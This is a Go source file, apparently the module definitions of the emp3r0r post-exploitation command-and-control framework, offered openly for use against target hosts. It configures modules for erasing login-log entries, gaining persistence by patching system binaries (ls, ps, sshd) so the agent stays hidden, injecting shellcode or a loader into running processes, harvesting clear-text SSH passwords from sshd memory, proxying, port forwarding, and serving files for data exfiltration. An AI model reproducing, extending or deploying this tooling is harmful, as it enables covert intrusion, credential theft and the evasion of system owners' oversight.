package def

import "fmt"

// built-in module names
const (
	ModCMD_EXEC     = "cmd_exec"
	ModCLEAN_LOG    = "clean_log"
	ModLPE_SUGGEST  = "lpe_suggest"
	ModPERSISTENCE  = "get_persistence"
	ModPROXY        = "run_proxy"
	ModPORT_FWD     = "port_fwd"
	ModSHELL        = "interactive_shell"
	ModVACCINE      = "vaccine"
	ModINJECTOR     = "injector"
	ModBring2CC     = "bring2cc"
	ModListener     = "listener"
	ModSSHHarvester = "ssh_harvester"
	ModFileServer   = "file_server"
	ModDownloader   = "file_downloader"
	ModMemDump      = "mem_dump"
)

// PersistMethods CC calls one of these methods to get persistence, or all of them at once
var PersistMethods = map[string]string{
	"profiles": "Add some aliases to shell profiles, will trigger when user logs in",
	"cron":     "Add a cronjob",
	"patcher":  "Patch binaries (ls, ps, pstree, sshd, bash, sh...) so they load loader.so on startup, it also make emp3r0r essentially invisible to those tools",
}

var InjectorMethods = map[string]string{
	"shellcode":      "Inject shellcode (see wiki), if no shellcode is specified, it will inject guardian.asm (runs emp3r0r as child process)",
	"shared_library": "Inject a shared library, if no library is specified, it will inject loader.so (ELF loader that runs emp3r0r agent)",
}

// ModOption represents module options
type ModOption struct {
	Name string   `json:"opt_name"` // option name
	Desc string   `json:"opt_desc"` // option description
	Val  string   `json:"opt_val"`  // option value
	Vals []string `json:"opt_vals"` // option value candidates
}

// ModOptions represents multiple module options
type ModOptions map[string]*ModOption

// AgentModuleConfig stores configuration data for the agent side
type AgentModuleConfig struct {
	Exec          string   `json:"exec"`        // Run this executable file on agent
	Files         []string `json:"files"`       // Files to be uploaded to agent
	InMemory      bool     `json:"in_memory"`   // run this module in memory
	Type          string   `json:"type"`        // "go", "python", "powershell", "bash", "exe", "elf", "dll", "so"
	IsInteractive bool     `json:"interactive"` // whether run as a shell or not, eg. python, bettercap
}

// ModuleConfig stores the complete module config data
type ModuleConfig struct {
	Name        string            `json:"name"`         // Display as this name
	Build       string            `json:"build"`        // Command to run on C2, you can use it to build module
	Author      string            `json:"author"`       // by whom
	Date        string            `json:"date"`         // when did you write it
	Comment     string            `json:"comment"`      // describe your module in one line
	IsLocal     bool              `json:"is_local"`     // If true, this module is a C2 plugin and doesn't run on agent, use `Build` to specify the command to run
	Platform    string            `json:"platform"`     // targeting which OS? Linux/Windows
	Path        string            `json:"path"`         // Path to the module directory
	Options     ModOptions        `json:"options"`      // module options, will be passed as environment variables to the module, either on C2 or agent side
	AgentConfig AgentModuleConfig `json:"agent_config"` // Configuration for agent side
}

// Module help info and options
var Modules = map[string]*ModuleConfig{
	ModVACCINE: {
		Name:     ModVACCINE,
		Build:    "",
		Author:   "jm33-ng",
		Date:     "2020-01-25",
		Comment:  "Install tools to RuntimeConfig.UtilsPath, for lateral movement",
		IsLocal:  false,
		Platform: "Linux",
		Path:     "",
		Options: ModOptions{
			"download_addr": &ModOption{
				Name: "download_addr",
				Desc: "Download address, useful if you want to download from other agents, use `file_server` first, eg. 10.1.1.1:8000",
				Val:  "",
			},
		},
		AgentConfig: AgentModuleConfig{
			Exec:          "built-in",
			Files:         []string{},
			InMemory:      false,
			Type:          "go",
			IsInteractive: false,
		},
	},
	ModCMD_EXEC: {
		Name:     ModCMD_EXEC,
		Build:    "",
		Author:   "jm33-ng",
		Date:     "2020-01-25",
		Comment:  "Run a single command on one or more targets",
		IsLocal:  false,
		Platform: "Generic",
		Path:     "",
		Options: ModOptions{
			"cmd_to_exec": &ModOption{
				Name: "cmd_to_exec",
				Desc: "Press TAB for some hints",
				Vals: []string{
					"id", "whoami", "ifconfig",
					"ip a", "arp -a",
					"ps -ef", "lsmod", "ss -antup",
					"netstat -antup", "uname -a",
				},
			},
		},
		AgentConfig: AgentModuleConfig{
			Exec:          "built-in",
			Files:         []string{},
			InMemory:      false,
			Type:          "go",
			IsInteractive: false,
		},
	},
	ModCLEAN_LOG: {
		Name:     ModCLEAN_LOG,
		Build:    "",
		Author:   "jm33-ng",
		Date:     "2020-01-25",
		Comment:  "Delete lines containing keyword from xtmp logs",
		IsLocal:  false,
		Platform: "Linux",
		Path:     "",
		Options: ModOptions{
			"keyword": &ModOption{
				Name: "keyword",
				Desc: "Delete all log entries containing this keyword",
				Vals: []string{"root", "admin"},
				Val:  "root",
			},
		},
		AgentConfig: AgentModuleConfig{
			Exec:          "built-in",
			Files:         []string{},
			InMemory:      false,
			Type:          "go",
			IsInteractive: false,
		},
	},
	ModLPE_SUGGEST: {
		Name:     ModLPE_SUGGEST,
		Build:    "",
		Author:   "jm33-ng",
		Date:     "2020-01-25",
		Comment:  "Run linux-smart-enumeration or linux exploit suggester",
		IsLocal:  false,
		Platform: "Generic",
		Path:     "",
		Options: ModOptions{
			"lpe_helper": &ModOption{
				Name: "lpe_helper",
				Desc: "Which LPE helper to use, available helpers: lpe_les (Linux exploit suggester), lpe_lse (Linux smart enumeration), lpe_linpeas (PEASS-ng, works on Linux), lpe_winpeas (PEASS-ng, works on Windows",
				Vals: []string{"lpe_les", "lpe_lse", "lpe_linpeas", "lpe_winpeas"},
				Val:  "lpe_les",
			},
		},
		AgentConfig: AgentModuleConfig{
			Exec:          "built-in",
			Files:         []string{},
			InMemory:      false,
			Type:          "go",
			IsInteractive: false,
		},
	},
	ModPERSISTENCE: {
		Name:     ModPERSISTENCE,
		Build:    "",
		Author:   "jm33-ng",
		Date:     "2020-01-25",
		Comment:  "Get persistence via built-in methods",
		IsLocal:  false,
		Platform: "Linux",
		Path:     "",
		Options: ModOptions{
			"method": &ModOption{
				Name: "method",
				Desc: fmt.Sprintf("Persistence method: profiles: %s; cron: %s; patcher: %s", PersistMethods["profiles"], PersistMethods["cron"], PersistMethods["patcher"]),
				Vals: []string{"profiles", "cron", "patcher"},
				Val:  "patcher",
			},
		},
		AgentConfig: AgentModuleConfig{
			Exec:          "built-in",
			Files:         []string{},
			InMemory:      false,
			Type:          "go",
			IsInteractive: false,
		},
	},
	ModPROXY: {
		Name:     ModPROXY,
		Build:    "",
		Author:   "jm33-ng",
		Date:     "2020-01-25",
		Comment:  "Start a socks proxy on target host",
		IsLocal:  false,
		Platform: "Generic",
		Path:     "",
		Options: ModOptions{
			"port": &ModOption{
				Name: "port",
				Desc: "Port of our local proxy server",
				Vals: []string{"1080", "8080", "10800", "10888"},
				Val:  "8080",
			},
			"status": &ModOption{
				Name: "status",
				Desc: "Turn proxy on/off",
				Vals: []string{"on", "off", "reverse"},
				Val:  "on",
			},
		},
		AgentConfig: AgentModuleConfig{
			Exec:          "built-in",
			Files:         []string{},
			InMemory:      false,
			Type:          "go",
			IsInteractive: false,
		},
	},
	ModPORT_FWD: {
		Name:     ModPORT_FWD,
		Build:    "",
		Author:   "jm33-ng",
		Date:     "2020-01-25",
		Comment:  "Port mapping from agent to CC",
		IsLocal:  false,
		Platform: "Generic",
		Path:     "",
		Options: ModOptions{
			"to": &ModOption{
				Name: "to",
				Desc: "Address:Port (to forward to) on agent/CC side",
				Vals: []string{"127.0.0.1:22", "127.0.0.1:8080"},
			},
			"listen_port": &ModOption{
				Name: "listen_port",
				Desc: "Listen port on CC/agent side",
				Vals: []string{"8080", "1080", "22", "23", "21"},
			},
			"switch": &ModOption{
				Name: "switch",
				Desc: "Turn port mapping on/off, or use `reverse` mapping",
				Vals: []string{"on", "off", "reverse"},
				Val:  "on",
			},
			"protocol": &ModOption{
				Name: "protocol",
				Desc: "Forward to TCP or UDP port on agent side",
				Vals: []string{"tcp", "udp"},
				Val:  "tcp",
			},
		},
		AgentConfig: AgentModuleConfig{
			Exec:          "built-in",
			Files:         []string{},
			InMemory:      false,
			Type:          "go",
			IsInteractive: false,
		},
	},
	ModSHELL: {
		Name:     ModSHELL,
		Build:    "",
		Author:   "jm33-ng",
		Date:     "2020-01-25",
		Comment:  "Bring your own shell program to run on target",
		IsLocal:  false,
		Platform: "Generic",
		Path:     "",
		Options: ModOptions{
			"shell": &ModOption{
				Name: "shell",
				Desc: "Shell program to run, eg. /bin/bash. Please use `elvish` module or upload a custom shell for opsec reasons. Default `bash` shell can be installed via module `vaccine`",
				Vals: []string{
					"/bin/bash", "/bin/zsh", "/bin/sh", "python", "python3",
					"cmd.exe", "powershell.exe", "elvish",
				},
				Val: "bash",
			},
			"args": &ModOption{
				Name: "args",
				Desc: "Command line args of the shell program",
				Val:  "",
			},
			"port": &ModOption{
				Name: "port",
				Desc: "The (sshd) port that our shell will be using",
				Val:  "22222",
			},
		},
		AgentConfig: AgentModuleConfig{
			Exec:          "built-in",
			Files:         []string{},
			InMemory:      false,
			Type:          "go",
			IsInteractive: true,
		},
	},
	ModINJECTOR: {
		Name:     ModINJECTOR,
		Build:    "",
		Author:   "jm33-ng",
		Date:     "2020-01-25",
		Comment:  "Inject shellcode/loader.so into a running process",
		IsLocal:  false,
		Platform: "Linux",
		Path:     "",
		Options: ModOptions{
			"pid": &ModOption{
				Name: "pid",
				Desc: "Target process PID, set to 0 to start a new process (sleep)",
				Vals: []string{"0"},
				Val:  "0",
			},
			"method": &ModOption{
				Name: "method",
				Desc: fmt.Sprintf("Injection method, available methods: shellcode: %s; shared_library: %s", InjectorMethods["shellcode"], InjectorMethods["shared_library"]),
				Vals: []string{"shellcode", "shared_library"},
				Val:  "shared_library",
			},
		},
		AgentConfig: AgentModuleConfig{
			Exec:          "built-in",
			Files:         []string{},
			InMemory:      false,
			Type:          "go",
			IsInteractive: false,
		},
	},
	ModBring2CC: {
		Name:     ModBring2CC,
		Build:    "",
		Author:   "jm33-ng",
		Date:     "2020-01-25",
		Comment:  "Bring arbitrary agent to CC",
		IsLocal:  false,
		Platform: "Generic",
		Path:     "",
		Options: ModOptions{
			"addr": &ModOption{
				Name: "addr",
				Desc: "Target host to proxy, we will connect to it and proxy it out",
				Vals: []string{"127.0.0.1"},
				Val:  "",
			},
			"kcp": &ModOption{
				Name: "kcp",
				Desc: "Use KCP (fast UDP tunnel) for proxy",
				Vals: []string{"on", "off"},
				Val:  "on",
			},
		},
		AgentConfig: AgentModuleConfig{
			Exec:          "built-in",
			Files:         []string{},
			InMemory:      false,
			Type:          "go",
			IsInteractive: false,
		},
	},
	ModListener: {
		Name:     ModListener,
		Build:    "",
		Author:   "jm33-ng",
		Date:     "2020-01-25",
		Comment:  "Start a listener to serve stagers or regular files",
		IsLocal:  false,
		Platform: "Generic",
		Path:     "",
		Options: ModOptions{
			"payload": &ModOption{
				Name: "payload",
				Desc: "The payload to serve, eg. ./stager",
			},
			"listener": &ModOption{
				Name: "listener",
				Desc: "Listener type, eg. http_bare, http_aes_compressed",
			},
			"port": &ModOption{
				Name: "port",
				Desc: "Port to listen on, eg. 8080",
			},
		},
		AgentConfig: AgentModuleConfig{
			Exec:          "built-in",
			Files:         []string{},
			InMemory:      false,
			Type:          "go",
			IsInteractive: false,
		},
	},
	ModSSHHarvester: {
		Name:     ModSSHHarvester,
		Build:    "",
		Author:   "jm33-ng",
		Date:     "2020-01-25",
		Comment:  "Harvest clear-text password automatically from OpenSSH server process",
		IsLocal:  false,
		Platform: "Linux",
		Path:     "",
		Options: ModOptions{
			"code_pattern": &ModOption{
				Name: "code_pattern",
				Desc: "Code pattern to set breakpoint, big-endian. emp3r0r will stop there and dump password, and check RAX to make sure password is valid",
				Val:  "4883c4080fb6c021",
			},
			"reg_name": &ModOption{
				Name: "reg_name",
				Desc: "Register name that stores password, eg. RDI",
				Val:  "RSI",
				Vals: []string{"RDI", "RSI", "RDX", "RCX", "R8", "R9", "RAX", "RBX", "RBP", "RSP", "RIP"},
			},
			"stop": &ModOption{
				Name: "stop",
				Desc: "Stop the harvester: no, yes",
				Val:  "no",
				Vals: []string{"no", "yes"},
			},
		},
		AgentConfig: AgentModuleConfig{
			Exec:          "built-in",
			Files:         []string{},
			InMemory:      false,
			Type:          "go",
			IsInteractive: false,
		},
	},
	ModFileServer: {
		Name:     ModFileServer,
		Build:    "",
		Author:   "jm33-ng",
		Date:     "2020-01-25",
		Comment:  "Start a secure file server on target host for data exfiltration and module file caching",
		IsLocal:  false,
		Platform: "Generic",
		Path:     "",
		Options: ModOptions{
			"port": &ModOption{
				Name: "port",
				Desc: "Port to listen on",
				Val:  "8000",
			},
			"switch": &ModOption{
				Name: "switch",
				Desc: "Turn file server on/off",
				Val:  "on",
			},
		},
		AgentConfig: AgentModuleConfig{
			Exec:          "built-in",
			Files:         []string{},
			InMemory:      false,
			Type:          "go",
			IsInteractive: false,
		},
	},
	ModDownloader: {
		Name:     ModDownloader,
		Build:    "",
		Author:   "jm33-ng",
		Date:     "2020-01-25",
		Comment:  "Download and decrypt a file from other agents, run `file_server` first",
		IsLocal:  false,
		Platform: "Generic",
		Path:     "",
		Options: ModOptions{
			"download_addr": &ModOption{
				Name: "download_addr",
				Desc: "Download address, eg 10.1.1.1:8000",
				Val:  "",
			},
			"path": &ModOption{
				Name: "path",
				Desc: "Path to the file (on server) to download, eg. /tmp/agent.exe",
				Val:  "",
			},
			"checksum": &ModOption{
				Name: "checksum",
				Desc: "SHA256 checksum of the file, used to verify integrity, wont't check if empty",
				Val:  "",
			},
		},
		AgentConfig: AgentModuleConfig{
			Exec:          "built-in",
			Files:         []string{},
			InMemory:      false,
			Type:          "go",
			IsInteractive: false,
		},
	},
	ModMemDump: {
		Name:     ModMemDump,
		Build:    "",
		Author:   "jm33-ng",
		Date:     "2020-01-25",
		Comment:  "Dump memory regions of a process",
		IsLocal:  false,
		Platform: "Generic",
		Path:     "",
		Options: ModOptions{
			"pid": &ModOption{
				Name: "pid",
				Desc: "PID of the target process",
				Val:  "",
			},
		},
		AgentConfig: AgentModuleConfig{
			Exec:          "built-in",
			Files:         []string{},
			InMemory:      false,
			Type:          "go",
			IsInteractive: false,
		},
	},
}
